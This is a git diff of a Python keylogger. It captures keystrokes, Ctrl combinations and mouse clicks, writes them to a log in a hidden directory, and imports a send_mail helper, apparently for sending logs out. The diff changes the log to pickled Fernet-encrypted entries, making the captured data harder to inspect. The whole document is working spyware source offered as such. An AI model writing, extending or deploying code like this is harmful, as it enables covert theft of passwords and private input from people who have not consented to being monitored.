@@ -5,22 +5,27 @@ from threading import Thread
 from send_mail import send_mail
 from constants import LOG_FILE, HIDE_DIR
 from os.path import join
+from pickle import load, dump
 
 
 def keyboard_press(key: Key) -> None:
     """
     on_press for keyboard listener.
     """
+    # Flag variable, when press F9, exit_ = True,
+    # terminate Keyboard listener and also terminate Mouse listener
     global exit_
 
     # Check if it's an alphanumeric key
     try:
-        temporary = str(key).replace("'", "")
         try:
-            key = CHARS[CODES.index(temporary)]
+            # Check if it's a combination key - goes with Ctrl
+            key = CHARS[CODES.index(str(key).replace("'", ""))]
             key = f"「{key}」"
+
+        # This can cause AttributeError (if it's not an alphanumeric key)
         except ValueError:
-            key = key.char
+            key = str(key.char)
 
     # Else it's a special key
     except AttributeError:
@@ -53,24 +58,20 @@ def keyboard_press(key: Key) -> None:
                 key = "↑"
             key = f"「{key}」"
 
-    finally:
-        write_to_log(key)
+    write_to_log(key)
 
 
 def mouse_click(x, y, button, pressed) -> None:
     """
     on_click for mouse listener.
     """
-    global keyboard_
     if exit_:
         return False
     if pressed:
-        if button == Button.middle:
-            button = "M"
-        elif button == Button.left:
+        if button == Button.left:
             button = "L"
         else:
-            button = "R"
+            button = "R" if (button == Button.right) else "M"
 
         s = "\n「{:4d} {:4d} {} {}」 ".format(x, y, button, get_time())
         write_to_log(s)
@@ -92,16 +93,16 @@ def mouse():
         mouse_listener.join()
 
 
-def write_to_log(s) -> None:
+def write_to_log(s: str) -> None:
     """
     Write data to the log file.
     """
-    print(s, end="", file=log_f)
+    dump(fernet.encrypt(s.encode("utf-8")), log_f)
 
 
 if __name__ == "__main__":
-    # When goes with CTRL, CHARS[i] is written as CODES[i], (0 <= i <= 35)
-    # Since the English alphabet has 26 letters from A to Z
+    # When goes with Ctrl, CHARS[i] is written as CODES[i] (0 <= i <= 35),
+    # since the English alphabet has 26 letters from A to Z
     # and 10 digits from 0 to 9, so total is 36 chars
     CHARS = ("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K",
              "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
@@ -118,7 +119,8 @@ if __name__ == "__main__":
 
     # Initialization
     exit_ = False
-    log_f = open(join(HIDE_DIR, LOG_FILE), "a", encoding="utf-8")
+    fernet = load(open("key.pkl", "rb"))
+    log_f = open(join(HIDE_DIR, LOG_FILE), "ab")
     write_to_log(f"\n\n「Keylogger started {get_time(day=True)}」\n")
 
     # Create thread
